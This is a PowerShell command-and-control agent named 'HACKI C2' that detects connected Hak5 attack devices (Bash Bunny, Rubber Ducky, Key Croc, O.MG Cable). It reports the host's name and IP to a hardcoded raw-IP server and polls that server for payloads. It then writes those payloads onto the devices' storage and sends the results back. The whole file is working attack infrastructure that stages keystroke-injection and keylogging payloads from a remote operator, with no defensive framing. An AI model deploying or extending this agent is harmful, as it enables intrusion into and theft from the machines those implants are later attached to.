# ═══════════════════════════════════════════════════════════════
# HACKI C2 — PC-Agent (PowerShell)
# Detects connected Hak5 devices, polls C2 for inject jobs,
# writes payloads to device storage, reports results.
# ═══════════════════════════════════════════════════════════════

param(
    [string]$C2Url = "http://152.53.154.171:3000",
    [string]$ApiKey = "",
    [int]$PollInterval = 10,
    [int]$DeviceId = 0
)

# ── Config ──
$ErrorActionPreference = "Continue"
$LogFile = Join-Path $env:TEMP "hacki-agent.log"

function Write-Log {
    param([string]$Msg)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] $Msg"
    Write-Host $line
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    # Log rotation (max 1MB)
    if ((Test-Path $LogFile) -and (Get-Item $LogFile).Length -gt 1MB) {
        $bak = "$LogFile.bak"
        if (Test-Path $bak) { Remove-Item $bak -Force }
        Rename-Item $LogFile $bak -Force
    }
}

# ── Device Detection ──
function Find-HakDevices {
    $found = @()

    # Scan removable drives
    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" -ErrorAction SilentlyContinue

    foreach ($drv in $drives) {
        $vol = $drv.VolumeName
        $letter = $drv.DeviceID  # e.g. "E:"

        # Bash Bunny: volume label "BashBunny" or has /payloads/switch1/
        if ($vol -match "BashBunny" -or (Test-Path "$letter\payloads\switch1")) {
            $found += @{
                type = "bash-bunny"
                drive = $letter
                volume = $vol
                ready = $true
            }
            Write-Log "[DETECT] Bash Bunny found on $letter (vol: $vol)"
        }
        # USB Rubber Ducky: volume label "Ducky" or has inject.bin
        elseif ($vol -match "Ducky|DUCKY" -or (Test-Path "$letter\inject.bin")) {
            $found += @{
                type = "rubber-ducky"
                drive = $letter
                volume = $vol
                ready = $true
            }
            Write-Log "[DETECT] USB Rubber Ducky found on $letter (vol: $vol)"
        }
        # Key Croc: volume label "KeyCroc" or has /payloads/
        elseif ($vol -match "KeyCroc|KEY_CROC" -or (Test-Path "$letter\payload\payload.txt")) {
            $found += @{
                type = "key-croc"
                drive = $letter
                volume = $vol
                ready = $true
            }
            Write-Log "[DETECT] Key Croc found on $letter (vol: $vol)"
        }
        # O.MG Cable: volume label "OMG" (when in flash mode)
        elseif ($vol -match "OMG") {
            $found += @{
                type = "omg-cable"
                drive = $letter
                volume = $vol
                ready = $true
            }
            Write-Log "[DETECT] O.MG Cable found on $letter (vol: $vol)"
        }
    }

    return $found
}

# ── API Helpers ──
function Invoke-C2 {
    param(
        [string]$Method = "POST",
        [string]$Path,
        [hashtable]$Body = @{},
        [hashtable]$Headers = @{}
    )
    $uri = "$C2Url$Path"
    $hdrs = @{ "Content-Type" = "application/json"; "X-Device-Key" = $ApiKey }
    foreach ($k in $Headers.Keys) { $hdrs[$k] = $Headers[$k] }

    try {
        $jsonBody = $Body | ConvertTo-Json -Compress -Depth 5
        $resp = Invoke-RestMethod -Uri $uri -Method $Method -Headers $hdrs -Body $jsonBody -TimeoutSec 10
        return $resp
    }
    catch {
        Write-Log "[ERROR] API call failed: $Path - $($_.Exception.Message)"
        return $null
    }
}

# ── Write Payload to Device ──
function Write-Payload {
    param(
        [string]$PayloadContent,
        [string]$PayloadPath,
        [string]$TargetDrive
    )

    # Build full path
    $fullPath = $PayloadPath
    if ($TargetDrive -and -not $PayloadPath.StartsWith($TargetDrive)) {
        $fullPath = $TargetDrive + $PayloadPath
    }

    # Ensure directory exists
    $dir = Split-Path $fullPath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        Write-Log "[WRITE] Created directory: $dir"
    }

    try {
        # Write payload (UTF-8 no BOM for Unix compatibility)
        $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
        [System.IO.File]::WriteAllText($fullPath, $PayloadContent, $utf8NoBom)
        $size = (Get-Item $fullPath).Length
        Write-Log "[WRITE] Payload written: $fullPath ($size bytes)"
        return @{ success = $true; details = "Wrote $size bytes to $fullPath" }
    }
    catch {
        Write-Log "[ERROR] Failed to write payload: $($_.Exception.Message)"
        return @{ success = $false; error = $_.Exception.Message }
    }
}

# ── Safely Eject Drive ──
function Invoke-SafeEject {
    param([string]$DriveLetter)
    try {
        $vol = Get-WmiObject Win32_Volume -Filter "DriveLetter='$DriveLetter'"
        if ($vol) {
            Write-Log "[EJECT] Attempting safe eject of $DriveLetter"
            # Use mountvol to dismount
            & mountvol $DriveLetter /P 2>$null
        }
    }
    catch {
        Write-Log "[EJECT] Eject failed: $($_.Exception.Message)"
    }
}

# ── Main Loop ──
function Start-Agent {
    Write-Log "═══════════════════════════════════════"
    Write-Log "HACKI C2 PC-Agent starting"
    Write-Log "C2: $C2Url"
    Write-Log "Poll interval: ${PollInterval}s"
    Write-Log "═══════════════════════════════════════"

    if (-not $ApiKey) {
        Write-Log "[FATAL] No API key provided. Use -ApiKey parameter."
        return
    }

    while ($true) {
        try {
            # 1. Detect connected devices
            $devices = Find-HakDevices

            # 2. Send heartbeat with connected devices
            $hbBody = @{
                hostname = $env:COMPUTERNAME
                ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" } | Select-Object -First 1).IPAddress
                connected_devices = $devices
            }

            $hbResp = Invoke-C2 -Path "/api/d/heartbeat" -Body $hbBody

            if ($hbResp -and $hbResp.inject_jobs -and $hbResp.inject_jobs.Count -gt 0) {
                foreach ($job in $hbResp.inject_jobs) {
                    Write-Log "[JOB] Received inject job #$($job.job_id) for $($job.target_device_type)"
                    Write-Log "[JOB] Payload path: $($job.payload_path)"
                    Write-Log "[JOB] Payload size: $($job.payload.Length) chars"

                    # Find matching connected device
                    $targetDev = $devices | Where-Object { $_.type -eq $job.target_device_type } | Select-Object -First 1

                    if (-not $targetDev) {
                        Write-Log "[JOB] No matching device connected for type: $($job.target_device_type)"
                        Invoke-C2 -Path "/api/d/inject-result" -Body @{
                            job_id = $job.job_id
                            success = $false
                            error = "Device disconnected during injection"
                        }
                        continue
                    }

                    # Write payload
                    $result = Write-Payload -PayloadContent $job.payload -PayloadPath $job.payload_path -TargetDrive $targetDev.drive

                    # Report result
                    $resultBody = @{
                        job_id = $job.job_id
                        success = $result.success
                    }
                    if ($result.success) {
                        $resultBody.details = $result.details
                    } else {
                        $resultBody.error = $result.error
                    }

                    $reportResp = Invoke-C2 -Path "/api/d/inject-result" -Body $resultBody
                    Write-Log "[JOB] Result reported: success=$($result.success)"
                }
            }
            elseif ($hbResp) {
                # Also poll inject-job endpoint as backup
                if ($devices.Count -gt 0) {
                    $ijResp = Invoke-C2 -Path "/api/d/inject-job" -Body @{ connected_devices = $devices }
                    if ($ijResp -and -not $ijResp.none) {
                        Write-Log "[JOB] Received inject job #$($ijResp.job_id) via poll"
                        $targetDev = $devices | Where-Object { $_.type -eq $ijResp.target_device_type } | Select-Object -First 1
                        if ($targetDev) {
                            $result = Write-Payload -PayloadContent $ijResp.payload -PayloadPath $ijResp.payload_path -TargetDrive $targetDev.drive
                            Invoke-C2 -Path "/api/d/inject-result" -Body @{
                                job_id = $ijResp.job_id
                                success = $result.success
                                details = if ($result.success) { $result.details } else { $null }
                                error = if (-not $result.success) { $result.error } else { $null }
                            }
                            Write-Log "[JOB] Result reported: success=$($result.success)"
                        }
                    }
                }
            }
        }
        catch {
            Write-Log "[ERROR] Main loop: $($_.Exception.Message)"
        }

        Start-Sleep -Seconds $PollInterval
    }
}

# ── Entry Point ──
Start-Agent
